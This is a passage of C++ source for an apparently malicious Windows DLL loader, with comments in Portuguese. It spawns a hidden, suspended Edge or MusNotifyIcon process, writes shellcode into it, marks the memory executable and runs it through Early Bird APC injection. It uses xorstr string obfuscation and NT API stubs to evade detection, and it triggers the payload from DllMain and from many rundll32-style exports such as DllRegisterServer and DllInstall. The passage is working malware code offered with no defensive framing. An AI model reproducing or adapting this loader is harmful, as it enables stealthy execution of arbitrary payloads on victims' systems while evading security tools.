    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    bool createdNew = false;
    DWORD pid = 0;
    {
        char targetPath[MAX_PATH];
        strcpy_s(targetPath, sizeof(targetPath), xorstr_("C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"));
        BOOL cpOk = _CreateProcessA(targetPath, NULL, NULL, NULL, FALSE,
            CREATE_NO_WINDOW | CREATE_SUSPENDED, NULL,
            xorstr_("C:\\Windows\\System32\\"), &si, &pi);
        if (!cpOk) {
            strcpy_s(targetPath, sizeof(targetPath), xorstr_("C:\\Windows\\System32\\MusNotifyIcon.exe"));
            cpOk = _CreateProcessA(targetPath, NULL, NULL, NULL, FALSE,
                CREATE_NO_WINDOW | CREATE_SUSPENDED, NULL,
                xorstr_("C:\\Windows\\System32\\"), &si, &pi);
        }
        if (!cpOk) return;
        pid = pi.dwProcessId;
        createdNew = true;
        // NÃO fechar pi.hProcess aqui — precisamos dele para Terminate/Close no cleanup
        // e pi.hThread é necessário para NtQueueApcThreadStub + ResumeThread.
    }

    // ---- abrir processo alvo ----
    HANDLE hProcess = NULL;
    CLIENT_ID clientId = { 0 };
    clientId.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
    clientId.UniqueThread = NULL;

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    NTSTATUS status = NtOpen(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &clientId);
    if (!NT_SUCCESS(status)) {
        if (createdNew) { _TerminateProcess(pi.hProcess, 0); _CloseHandle(pi.hProcess); _CloseHandle(pi.hThread); }
        return;
    }

    // ---- alocar memória remota ----
    PVOID allocBuffer = NULL;
    SIZE_T allocSize = shellcodeSize;
    status = NtAllocateVM(hProcess, &allocBuffer, 0, &allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
        _CloseHandle(hProcess);
        if (createdNew) { _TerminateProcess(pi.hProcess, 0); _CloseHandle(pi.hProcess); _CloseHandle(pi.hThread); }
        return;
    }

    // ---- escrever shellcode ----
    SIZE_T bytesWritten = 0;
    status = NtWriteVM(hProcess, allocBuffer, shellcode.data(), shellcodeSize, &bytesWritten);
    if (!NT_SUCCESS(status) || bytesWritten != shellcodeSize) {
        _CloseHandle(hProcess);
        if (createdNew) { _TerminateProcess(pi.hProcess, 0); _CloseHandle(pi.hProcess); _CloseHandle(pi.hThread); }
        return;
    }

    // ---- tornar executável (necessário para o APC executar o shellcode) ----
    PVOID protBase = allocBuffer;
    SIZE_T protSize = shellcodeSize;
    ULONG oldProt = 0;
    status = NtProtectVM(hProcess, &protBase, &protSize, PAGE_EXECUTE_READWRITE, &oldProt);
    if (!NT_SUCCESS(status)) {
        _CloseHandle(hProcess);
        if (createdNew) { _TerminateProcess(pi.hProcess, 0); _CloseHandle(pi.hProcess); _CloseHandle(pi.hThread); }
        return;
    }

    // ============================================================
    //  APC QUEUE INJECTION (Early Bird)
    //  Em vez de GetThreadContext/SetThreadContext/ResumeThread,
    //  enfileiramos um APC que aponta para o shellcode e depois
    //  resumimos a thread. O APC será executado antes do entry
    //  point original do processo alvo.
    // ============================================================
    status = NtQueueApcThreadStub(pi.hThread, allocBuffer, NULL, NULL, NULL);
    if (!NT_SUCCESS(status)) {
        _CloseHandle(hProcess);
        _TerminateProcess(pi.hProcess, 0);
        _CloseHandle(pi.hThread);
        _CloseHandle(pi.hProcess);
        return;
    }

    // Resume dispara o APC enfileirado (Early Bird execution)
    _ResumeThread(pi.hThread);
    _CloseHandle(pi.hThread);
    _CloseHandle(pi.hProcess);
    _CloseHandle(hProcess);
}

// ============================================================
//  WorkerThread
// ============================================================
static DWORD WINAPI WorkerThread(LPVOID) {
    if (InterlockedCompareExchange(&g_workStarted, 1, 0) != 0) return 0;
    Worker();
    InterlockedExchange(&g_workDone, 1);
    return 0;
}

// ============================================================
//  Exports (rundll32 style)
//  Sem __declspec(dllexport) — exportados pelo Source.def
// ============================================================
extern "C" void CALLBACK Rundll32Function(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
    (void)hwnd; (void)hinst; (void)lpszCmdLine; (void)nCmdShow;
    LaunchWorkerOrInline();
    WaitWorkerDone(15000);
}

extern "C" void CALLBACK DllRegisterServer(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
    (void)hwnd; (void)hinst; (void)lpszCmdLine; (void)nCmdShow;
    LaunchWorkerOrInline();
    WaitWorkerDone(15000);
}

extern "C" void CALLBACK DllUnregisterServer(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
    (void)hwnd; (void)hinst; (void)lpszCmdLine; (void)nCmdShow;
    LaunchWorkerOrInline();
    WaitWorkerDone(15000);
}

extern "C" void CALLBACK DllInstall(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
    (void)hwnd; (void)hinst; (void)lpszCmdLine; (void)nCmdShow;
    LaunchWorkerOrInline();
    WaitWorkerDone(15000);
}

extern "C" void CALLBACK ExDllCanUnloadNow(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
    (void)hwnd; (void)hinst; (void)lpszCmdLine; (void)nCmdShow;
    LaunchWorkerOrInline();
    WaitWorkerDone(15000);
}

extern "C" void CALLBACK ExDllGetClassObject(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
    (void)hwnd; (void)hinst; (void)lpszCmdLine; (void)nCmdShow;
    LaunchWorkerOrInline();
    WaitWorkerDone(15000);
}

// ============================================================
//  DllMain
// ============================================================
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH)
    {
        ResolveOnce();
        if (_DisableThreadLibraryCalls) _DisableThreadLibraryCalls(hModule);
        if (_CreateThread) {
            HANDLE hT = _CreateThread(NULL, 0, WorkerThread, NULL, 0, NULL);
            if (hT && _CloseHandle) _CloseHandle(hT);
        }
    }
    else if (ul_reason_for_call == DLL_PROCESS_DETACH) {
        if (lpReserved == NULL && InterlockedCompareExchange(&g_workStarted, 0, 0) != 0
            && InterlockedCompareExchange(&g_workDone, 0, 0) == 0) {
            WaitWorkerDone(10000);
        }
    }
    (void)lpReserved;
    return TRUE;
}